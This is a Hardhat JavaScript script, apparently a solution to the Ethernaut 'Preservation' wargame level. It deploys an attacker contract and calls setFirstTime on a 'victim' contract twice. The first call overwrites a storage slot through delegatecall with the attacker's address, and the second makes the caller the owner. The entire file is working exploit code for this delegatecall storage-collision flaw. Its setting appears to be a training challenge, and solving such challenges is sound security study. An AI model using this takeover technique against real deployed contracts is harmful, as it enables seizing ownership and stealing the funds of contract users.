
const hre = require("hardhat");

async function main() {
  const victimContractAddress = '0x5BEd50282fF074FCDa363fc76568bA923380b052';
  const myPublicKey = "0xF60Ba5a095EFAFA71c4c71e3E0C0c09Bcc76FEf4";

  const Preservation = await hre.ethers.getContractFactory("Preservation");
  const preservation = Preservation.attach(victimContractAddress);

  const PreservationAttacker = await hre.ethers.getContractFactory("PreservationAttacker");
  const preservationAttacker = await PreservationAttacker.deploy();

  console.log("Preservation Attacker deployed to:", preservationAttacker.address);

  const attackerAddressAsUint = await preservationAttacker.getAdressAsUint(preservationAttacker.address);
  await preservation.setFirstTime(attackerAddressAsUint);

  const myAddressAsUint =  await preservationAttacker.getAdressAsUint(myPublicKey);
  await preservation.setFirstTime(myAddressAsUint, {gasLimit: 50000}); // was running out of gas

  console.log("Succesful attack!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
